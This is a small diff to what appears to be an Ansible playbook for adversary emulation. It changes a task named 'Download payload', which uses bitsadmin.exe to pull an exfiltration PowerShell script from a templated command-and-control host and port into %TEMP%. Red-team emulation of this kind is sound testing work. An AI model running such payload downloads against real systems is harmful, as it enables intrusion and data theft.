@@ -6,4 +6,4 @@
   tasks:
           - name: Download payload
             tags: always
-            win_command: bitsadmin.exe  /transfer /Download /priority Foreground https://{{ cnc_fqdn }}/{{ exfil_script_windows }} %TEMP%\bitsadmin_flag.ps1
+            win_command: bitsadmin.exe  /transfer /Download /priority Foreground https://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} %TEMP%\bitsadmin_flag.ps1
